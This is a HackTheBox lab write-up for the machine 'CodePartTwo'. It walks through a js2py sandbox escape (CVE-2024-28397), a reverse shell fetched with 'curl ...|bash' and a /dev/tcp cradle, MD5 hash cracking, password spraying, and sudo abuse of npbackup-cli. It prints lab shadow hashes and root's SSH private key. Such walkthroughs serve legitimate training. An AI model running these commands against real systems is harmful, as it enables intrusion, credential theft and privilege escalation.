---
render_with_liquid: false
title: HackTheBox Writeup - CodePartTwo
date: 2025-09-16 12:03:50 +1400
tags: [hackthebox, nmap, linux, feroxbuster, python, python-flask, sqlite, js2py, code-injection, cve-2024-28397, discover-secrets, hashcat, password-spraying, sudo, npbackup-cli, backup-solution, file-read]
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/ea23d7bc12459ef0c3db19067f02352a.png
    width: 640
    height: 480
---




# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/CodePartTwo]
└─$ pt init '10.10.11.82'
╒═════════════╤═════════════╤═════════════╤══════════╤═════════════╕
│ profile     │ lhost       │ rhost       │ domain   │ ip          │
╞═════════════╪═════════════╪═════════════╪══════════╪═════════════╡
│ codeparttwo │ 10.10.14.67 │ 10.10.11.82 │          │ 10.10.11.82 │
╘═════════════╧═════════════╧═════════════╧══════════╧═════════════╛
```


## Nmap

```bash
# Nmap 7.95 scan initiated Tue Sep 16 12:03:49 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,8000, 10.10.11.82
Nmap scan report for 10.10.11.82
Host is up, received user-set (0.100s latency).
Scanned at 2025-09-16 12:03:50 CST for 10s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnwmWCXCzed9BzxaxS90h2iYyuDOrE2LkavbNeMlEUPvMpznuB9cs8CTnUenkaIA8RBb4mOfWGxAQ6a/nmKOea1FA6rfGG+fhOE/R1g8BkVoKGkpP1hR2XWbS3DWxJx3UUoKUDgFGSLsEDuW1C+ylg8UajGokSzK9NEg23WMpc6f+FORwJeHzOzsmjVktNrWeTOZthVkvQfqiDyB4bN0cTsv1mAp1jjbNnf/pALACTUmxgEemnTOsWk3Yt1fQkkT8IEQcOqqGQtSmOV9xbUmv6Y5ZoCAssWRYQ+JcR1vrzjoposAaMG8pjkUnXUN0KF/AtdXE37rGU0DLTO9+eAHXhvdujYukhwMp8GDi1fyZagAW+8YJb8uzeJBtkeMo0PFRIkKv4h/uy934gE0eJlnvnrnoYkKcXe+wUjnXBfJ/JhBlJvKtpLTgZwwlh95FJBiGLg5iiVaLB2v45vHTkpn5xo7AsUpW93Tkf+6ezP+1f3P7tiUlg3ostgHpHL5Z9478=
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBErhv1LbQSlbwl0ojaKls8F4eaTL4X4Uv6SYgH6Oe4Y+2qQddG0eQetFslxNF8dma6FK2YGcSZpICHKuY+ERh9c=
|   256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJovaecM3DB4YxWK2pI7sTAv9PrxTbpLG2k97nMp+FM
8000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodePartTwo
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 16 12:04:00 2025 -- 1 IP address (1 host up) scanned in 11.65 seconds
```


## 80 - HTTP : CodePartTwo


### Info

```ruby
http://10.10.11.82:8000 [200] [Welcome to CodePartTwo] [gunicorn/20.0.4] [aa3096f40d0e2a872e38a4e4abd13127f0d6237b] [Python,gunicorn:20.0.4]
```

![](/assets/obsidian/322a28a36f5e600347d1f13057535005.png)


### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/CodePartTwo]
└─$ URL="http://$(pt get rhost):8000"; OUT="$(echo $URL | awk -F':' '{print $NF}' | sed -e 's|[/:]|-|g')"; feroxbuster -k -A -w <(cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt|anew) -u "$URL" -o "ferox_${OUT}.txt"

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.82:8000
 🚀  Threads               │ 50
 📖  Wordlist              │ /proc/self/fd/11
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_8000.txt
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       20l       44w      651c http://10.10.11.82:8000/register
200      GET       48l      284w    17415c http://10.10.11.82:8000/download
302      GET        5l       22w      189c http://10.10.11.82:8000/logout => http://10.10.11.82:8000/
200      GET      210l      571w     4808c http://10.10.11.82:8000/static/css/styles.css
200      GET       20l       46w      667c http://10.10.11.82:8000/login
200      GET       98l      247w     3309c http://10.10.11.82:8000/static/js/script.js
200      GET       47l      202w     2212c http://10.10.11.82:8000/
302      GET        5l       22w      199c http://10.10.11.82:8000/dashboard => http://10.10.11.82:8000/login
[####################] - 5m     63176/63176   0s      found:8       errors:2
[####################] - 5m     63168/63168   229/s   http://10.10.11.82:8000/ 
```

- Hidden endpoints

```bash
┌──(bravosec㉿fsociety)-[~/htb/CodePartTwo]
└─$ curl http://10.10.11.82:8000/static/js/script.js -s | grep -F 'fetch('
        fetch('/run_code', {
        fetch('/save_code', {
            fetch(`/delete_code/${codeId}`, {
```


# User Flag
---

## Shell as app


### 8000 - CodePartTwo : Analyze APP's code

Downloaded the APP from [http://10.10.11.82:8000/download](http://10.10.11.82:8000/download)

![](/assets/obsidian/f4f389503740e4195be1e3709b446228.png)

It contains interesting files such as `app/app.py` (Core source code), `app/requirements.txt` (Dependencies), `app/instance/users.db` (Database)

```bash
┌──(bravosec㉿fsociety)-[~/Downloads]
└─$ 7z l app.zip
[...]

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2025-09-01 21:33:34 D....            0            0  app
2024-10-27 01:57:30 D....            0            0  app/static
2025-01-17 12:54:14 D....            0            0  app/static/css
2025-01-17 12:46:38 .....         4014         1209  app/static/css/styles.css
2025-01-17 12:30:04 D....            0            0  app/static/js
2024-10-27 01:57:30 .....         3309          785  app/static/js/script.js
2025-09-01 21:33:33 .....         3679         1172  app/app.py
2025-09-01 21:32:59 D....            0            0  app/templates
2025-09-01 21:32:59 .....         2069          791  app/templates/dashboard.html
2025-09-01 21:32:59 .....         4469         1227  app/templates/reviews.html
2025-09-01 21:32:59 .....         2554         1042  app/templates/index.html
2025-09-01 21:32:59 .....         1157          466  app/templates/base.html
2025-09-01 21:32:59 .....          696          372  app/templates/register.html
2025-09-01 21:32:59 .....          728          384  app/templates/login.html
2025-01-17 12:36:22 .....           49           45  app/requirements.txt
2025-01-17 12:50:10 D....            0            0  app/instance
2025-01-17 12:50:10 .....        16384          373  app/instance/users.db
------------------- ----- ------------ ------------  ------------------------
2025-09-01 21:33:34              39108         7866  11 files, 6 folders
```

Unzip the archive

```bash
7z x app.zip
```

- There's a secret key in source code

> `app/app.py`

![](/assets/obsidian/c73e038d56ae8aa48400f2564f2be322.png)

- Nothiing interesting in the **sqlite** database

```bash
┌──(bravosec㉿fsociety)-[~/Downloads]
└─$ sqlite3 app/instance/users.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(80) NOT NULL,
        password_hash VARCHAR(128) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
);
CREATE TABLE code_snippet (
        id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        code TEXT NOT NULL,
        PRIMARY KEY (id),
        FOREIGN KEY(user_id) REFERENCES user (id)
);
COMMIT;
```

- Dependency : `js2py==0.74` is sus

```bash
┌──(bravosec㉿fsociety)-[~/Downloads]
└─$ cat app/requirements.txt
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```


### 8000 - js2py 0.74 : Code Injection (CVE-2024-28397)

- Google : `js2py==0.74 exploit`

> POC - https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py

> Snyk - https://security.snyk.io/vuln/SNYK-PYTHON-JS2PY-7300331

> Nuclei Template - https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-28397.yaml

> **CVE-2024-28397**
> 
> [Js2Py](https://pypi.org/project/Js2Py) is a JavaScript to Python Translator & JavaScript interpreter written in 100% pure Python.
> 
> Affected versions of this package are vulnerable to Code Injection through the `disable_pyimport` component. With this vulnerability, if the threat actor hosts a website containing a malicious js file or sends a malicious script via HTTP API for victim to parse, usual restrictions can be evaded and any command can be executed on the host.
{: .prompt-info }

- `poc.py` basically attempt to find `subprocess.Popen` via rotating through python subclasses in order to run system commands, just like **SSTI** exploitation

![](/assets/obsidian/54754942328d0435bca48b54ac889d47.png)

After registering a user via [http://10.10.11.82:8000/register](http://10.10.11.82:8000/register), we're able to access http://10.10.11.82:8000/dashboard

![](/assets/obsidian/c8c87437d2be0a231f36d5c5d97ad100.png)

![](/assets/obsidian/7d9c225a056cad125f82e15fbe64dc59.png)

By running the payload from POC, we've got an error : `Error: 'NoneType' object is not callable`

![](/assets/obsidian/d62f04621a0e8cf42a1285ee3c9a5631.png)

By making requests to our HTTP server, we can make sure that the did command executed successfully

![](/assets/obsidian/da44a91094153146684d8aa327312401.png)

![](/assets/obsidian/939a45ef516d053258180cf245a89d62.png)

Host a web cradle for reverse shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/CodePartTwo]
└─$ PORT="80"; fuser -k "$PORT/tcp" 2>/dev/null; mkdir -p www && echo -e '#!/bin/sh\nsh -i >& /dev/tcp/10.10.14.67/1111 0>&1' > www/index.html && python -m http.server $PORT -d www
 771011Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Start reverse shell listener

```bash
nc -lvnp 1111
```

Get a reverse shell

```javascript
let cmd = "curl 10.10.14.67|bash"
[...]
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/CodePartTwo]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.67] from (UNKNOWN) [10.10.11.82] 49200
sh: 0: can't access tty; job control turned off
$ /usr/bin/script -qc /bin/bash /dev/null
bash-5.0$ ^Z
zsh: suspended  nc -lvnp 1111

stty raw -echo;fg
┌──(bravosec㉿fsociety)-[~/htb/CodePartTwo]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
bash-5.0$ stty rows 24 columns 209
bash-5.0$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```


## Shell as marco


### Harvesting - Sqlite Database : User credentials

`users.db` should contain something from the running app

```bash
bash-5.0$ ls -latr
total 32
-rw-rw-r-- 1 app app   49 Jan 17  2025 requirements.txt
-rw-r--r-- 1 app app 3679 Sep  1 13:19 app.py
drwxr-xr-x 2 app app 4096 Sep  1 13:20 templates
drwxr-xr-x 2 app app 4096 Sep  1 13:25 __pycache__
drwxr-xr-x 4 app app 4096 Sep  1 13:36 static
drwxrwxr-x 6 app app 4096 Sep 16 09:15 .
drwxr-x--- 5 app app 4096 Sep 16 09:30 ..
drwxrwxr-x 2 app app 4096 Sep 16 16:23 instance
bash-5.0$ ls -latr instance/
total 32
drwxrwxr-x 6 app app  4096 Sep 16 09:15 ..
-rw-r--r-- 1 app app 24576 Sep 16 16:23 users.db
drwxrwxr-x 2 app app  4096 Sep 16 16:23 .
```

Got some MD5 hashes from `users.db`

```bash
bash-5.0$ sqlite3 instance/users.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(80) NOT NULL,
        password_hash VARCHAR(128) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
);
INSERT INTO user VALUES(1,'marco','649c9d65a206a75f5abe509fe128bce5');
INSERT INTO user VALUES(2,'app','a97588c0e2fa3a024876339e27aeb42e');
INSERT INTO user VALUES(3,'bravosec','f773be41d59ce82e2c683cb28ea9afed');
[...]
```

Extract and crack the hashes

```bash
┌──(bravosec㉿fsociety)-[~/htb/CodePartTwo]
└─$ cat loot/users.db.log | awk -F"'" '{print $2":"$4}' | tee loot/users.db.hash
marco:649c9d65a206a75f5abe509fe128bce5
app:a97588c0e2fa3a024876339e27aeb42e
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/CodePartTwo]
└─$ hashcat loot/users.db.hash /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --user -m 0
hashcat (v6.2.6) starting
[...]

┌──(bravosec㉿fsociety)-[~/htb/CodePartTwo]
└─$ hashcat loot/users.db.hash /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --user -m 0 --show
marco:649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove
```


### Password spray

```bash
bash-5.0$ PASS='sweetangelbabylove'; for USER in $(cat /etc/passwd|grep -viE 'false$|nologin$|sync$'|awk -F: '{print $1}'); do (echo $PASS | su "$USER" -c whoami) & done
[1] 61298
[2] 61299
[3] 61300
bash-5.0$ Password: Password: Password: marco
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/CodePartTwo]
└─$ sshpass -p 'sweetangelbabylove' ssh -o "StrictHostKeyChecking no" marco@10.10.11.82
Warning: Permanently added '10.10.11.82' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
[...]

-bash-5.0$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1003(backups)
-bash-5.0$ cat user.txt
1edac9c28f047db86dea1fdd6d82cdf9
```


# Root Flag
---

## Shell as root


### SUDO - npbackup-cli : File read

`backups` group owns `/opt/*`

```bash
-bash-5.0$ find / -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" -not -path "/var/lib/*" -group backups -ls 2>/dev/null
   131077      4 drwxr-xr-x   3 root     backups      4096 Apr  5 23:59 /opt
   174148      4 drwxr-x---   2 root     backups      4096 Apr  6 00:07 /opt/npbackup-cli
```

`marco` can run `/usr/local/bin/npbackup-cli` as `root` without password

```bash
-bash-5.0$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

`/usr/local/bin/npbackup-cli` is a python script that all users can run

```bash
-bash-5.0$ ls -la /usr/local/bin/npbackup-cli
-rwxr-xr-x 1 root root 393 Jun 11 08:47 /usr/local/bin/npbackup-cli
-bash-5.0$ file /usr/local/bin/npbackup-cli
/usr/local/bin/npbackup-cli: Python script, ASCII text executable
```

The python script imports `npbackup` and perform some security checks

```bash
-bash-5.0$ cat /usr/local/bin/npbackup-cli
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from npbackup.__main__ import main
if __name__ == '__main__':
    # Block restricted flag
    if '--external-backend-binary' in sys.argv:
        print("Error: '--external-backend-binary' flag is restricted for use.")
        sys.exit(1)

    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

Checked `npbackup`'s version from global python packages, no publicly known exploits found

```bash
-bash-5.0$ pip freeze | grep npbackup
npbackup==3.0.1
```

> Repo - https://github.com/netinvent/npbackup

Now it's time to test functions from `npbackup` that can be abused as `root` (such as file read/write, code/command execution, library hijack...)

```bash
sudo /usr/local/bin/npbackup-cli
```

It requires a config file

![](/assets/obsidian/b8dc8700801be5adea3a535b32b79b27.png)

```bash
-bash-5.0$ sudo /usr/local/bin/npbackup-cli --help
```

Default config file should be `npbackup.conf`

![](/assets/obsidian/9049c0e4c16cbb6aa484bcc4593a00bd.png)

There's an example `npbackup.conf` in `marco`'s home directory

```bash
-bash-5.0$ find / -type f -iname *npbackup.conf* 2>/dev/null
/home/marco/npbackup.conf
-bash-5.0$ cat /home/marco/npbackup.conf
[...]
```

The configuration file sets `/home/app/app` to backup

![](/assets/obsidian/8e78698ca6dcf5c5d17f776856319b5c.png)

Clone a new config file and backup `/root` instead

```bash
sed 's|/home/app/app/|/root|g' npbackup.conf > test.conf
```

```bash
sudo /usr/local/bin/npbackup-cli -c ./test.conf
```

We have to specify `-b` for backup operation

![](/assets/obsidian/529fd303c9165f90b9ca7fd46f5c15fe.png)

![](/assets/obsidian/0f0fc6bd145755a435d5942a58758d48.png)

```bash
sudo /usr/local/bin/npbackup-cli -c ./test.conf -b
```

![](/assets/obsidian/7b2462d379531e0e5a13c30b7dbdc5df.png)

List snapshots

![](/assets/obsidian/54ad63dae76a4242a8e9ab9c956573f3.png)

```bash
sudo /usr/local/bin/npbackup-cli -c ./test.conf -s
```

![](/assets/obsidian/74c778c425142d78a2397bd0e736a716.png)

List entries in `/root`

![](/assets/obsidian/72a26766f36235803462946be41a74bf.png)

```bash
sudo /usr/local/bin/npbackup-cli -c ./test.conf --ls
```

![](/assets/obsidian/946fccbd73de32bf04e409cce4465f62.png)

View `root`'s ssh private key

![](/assets/obsidian/d4f6bc1dabaf190a43ff0eddcfe5d257.png)

```bash
-bash-5.0$ sudo /usr/local/bin/npbackup-cli -c ./test.conf --dump '/root/.ssh/id_rsa'
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

SSH as `root`

```bash
┌──(bravosec㉿fsociety)-[~/htb/CodePartTwo]
└─$ vi loot/root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/CodePartTwo]
└─$ chmod 600 loot/root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/CodePartTwo]
└─$ ssh -i loot/root.id_rsa root@$(pt get rhost)
[...]
root@codeparttwo:~# id
uid=0(root) gid=0(root) groups=0(root)
root@codeparttwo:~# cat root.txt
b9f17e0d85efa5184d8c8580a8704879
```


# Additional
---

## Post exploitation


### Secrets

```bash
root@codeparttwo:~# awk -F: '$2 ~ /^\$/' /etc/shadow
root:$6$UM1RuabUYlt5BQ5q$ZtzAfYOaCaFxA8MGbyH1hegFpzQmJrpIkx7vEIKvXoVl830AXAx1Hgh8r11GlpXgY25LK8wF76nvQYQ1wLSn71:20104:0:99999:7:::
marco:$6$i5xRI7UVqeBITIby$NQKHXVvAWz7Vl3QkEwgxw0ItF9Lwen4gGCBi.YYiDQTdkgcPABaqfmBzheAM/9JA/9J7szqDzPaIDbkNqc.0V.:20022:0:99999:7:::
app:$6$5iH3Zik78QR8t9Se$bgRAig/YjbMzwOTFME629sLrrTn2avVD9pLFwz0X2zBTz0LYfNIEuw6w5s53NNu2K7IeEJK4D6j9PB6SR.UvC0:20022:0:99999:7:::
```


### Files

```bash
[+] /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA9apNjja2/vuDV4aaVheXnLbCe7dJBI/l4Lhc0nQA5F9wGFxkvIEy
VXRep4N+ujxYKVfcT3HZYR6PsqXkOrIb99zwr1GkEeAIPdz7ON0pwEYFxsHHnBr+rPAp9d
EaM7OOojou1KJTNn0ETKzvxoYelyiMkX9rVtaETXNtsSewYUj4cqKe1l/w4+MeilBdFP7q
kiXtMQ5nyiO2E4gQAvXQt9bkMOI1UXqq+IhUBoLJOwxoDwuJyqMKEDGBgMoC2E7dNmxwJV
XQSdbdtrqmtCZJmPhsAT678v4bLUjARk9bnl34/zSXTkUnH+bGKn1hJQ+IG95PZ/rusjcJ
hNzr/GTaAntxsAZEvWr7hZF/56LXncDxS0yLa5YVS8YsEHerd/SBt1m5KCAPGofMrnxSSS
pyuYSlw/OnTT8bzoAY1jDXlr5WugxJz8WZJ3ItpUeBi4YSP2Rmrc29SdKKqzryr7AEn4sb
JJ0y4l95ERARsMPFFbiEyw5MGG3ni61Xw62T3BTlAAAFiCA2JBMgNiQTAAAAB3NzaC1yc2
EAAAGBAPWqTY42tv77g1eGmlYXl5y2wnu3SQSP5eC4XNJ0AORfcBhcZLyBMlV0XqeDfro8
WClX3E9x2WEej7Kl5DqyG/fc8K9RpBHgCD3c+zjdKcBGBcbBx5wa/qzwKfXRGjOzjqI6Lt
SiUzZ9BEys78aGHpcojJF/a1bWhE1zbbEnsGFI+HKintZf8OPjHopQXRT+6pIl7TEOZ8oj
thOIEAL10LfW5DDiNVF6qviIVAaCyTsMaA8LicqjChAxgYDKAthO3TZscCVV0EnW3ba6pr
QmSZj4bAE+u/L+Gy1IwEZPW55d+P80l05FJx/mxip9YSUPiBveT2f67rI3CYTc6/xk2gJ7
cbAGRL1q+4WRf+ei153A8UtMi2uWFUvGLBB3q3f0gbdZuSggDxqHzK58UkkqcrmEpcPzp0
0/G86AGNYw15a+VroMSc/FmSdyLaVHgYuGEj9kZq3NvUnSiqs68q+wBJ+LGySdMuJfeREQ
EbDDxRW4hMsOTBht54utV8Otk9wU5QAAAAMBAAEAAAGBAJYX9ASEp2/IaWnLgnZBOc901g
RSallQNcoDuiqW14iwSsOHh8CoSwFs9Pvx2jac8dxoouEjFQZCbtdehb/a3D2nDqJ/Bfgp
4b8ySYdnkL+5yIO0F2noEFvG7EwU8qZN+UJivAQMHT04Sq0yJ9kqTnxaOPAYYpOOwwyzDn
zjW99Efw9DDjq6KWqCdEFbclOGn/ilFXMYcw9MnEz4n5e/akM4FvlK6/qZMOZiHLxRofLi
1J0Elq5oyJg2NwJh6jUQkOLitt0KjuuYPr3sRMY98QCHcZvzUMmJ/hPZIZAQFtJEtXHkt5
UkQ9SgC/LEaLU2tPDr3L+JlrY1Hgn6iJlD0ugOxn3fb924P2y0Xhar56g1NchpNe1kZw7g
prSiC8F2ustRvWmMPCCjS/3QSziYVpM2uEVdW04N702SJGkhJLEpVxHWszYbQpDatq5ckb
SaprgELr/XWWFjz3FR4BNI/ZbdFf8+bVGTVf2IvoTqe6Db0aUGrnOJccgJdlKR8e2nwQAA
AMEA79NxcGx+wnl11qfgc1dw25Olzc6+Jflkvyd4cI5WMKvwIHLOwNQwviWkNrCFmTihHJ
gtfeE73oFRdMV2SDKmup17VzbE47x50m0ykT09KOdAbwxBK7W3A99JDckPBlqXe0x6TG65
UotCk9hWibrl2nXTufZ1F3XGQu1LlQuj8SHyijdzutNQkEteKo374/AB1t2XZIENWzUZNx
vP8QwKQche2EN1GQQS6mGWTxN5YTGXjp9jFOc0EvAgwXczKxJ1AAAAwQD7/hrQJpgftkVP
/K8GeKcY4gUcfoNAPe4ybg5EHYIF8vlSSm7qy/MtZTh2Iowkt3LDUkVXcEdbKm/bpyZWre
0P6Fri6CWoBXmOKgejBdptb+Ue+Mznu8DgPDWFXXVkgZOCk/1pfAKBxEH4+sOYOr8o9SnI
nSXtKgYHFyGzCl20nAyfiYokTwX3AYDEo0wLrVPAeO59nQSroH1WzvFvhhabs0JkqsjGLf
kMV0RRqCVfcmReEI8S47F/JBg/eOTsWfUAAADBAPmScFCNisrgb1dvow0vdWKavtHyvoHz
bzXsCCCHB9Y+33yrL4fsaBfLHoexvdPX0Ssl/uFCilc1zEvk30EeC1yoG3H0Nsu+R57BBI
o85/zCvGKm/BYjoldz23CSOFrssSlEZUppA6JJkEovEaR3LW7b1pBIMu52f+64cUNgSWtH
kXQKJhgScWFD3dnPx6cJRLChJayc0FHz02KYGRP3KQIedpOJDAFF096MXhBT7W9ZO8Pen/
MBhgprGCU3dhhJMQAAAAxyb290QGNvZGV0d28BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```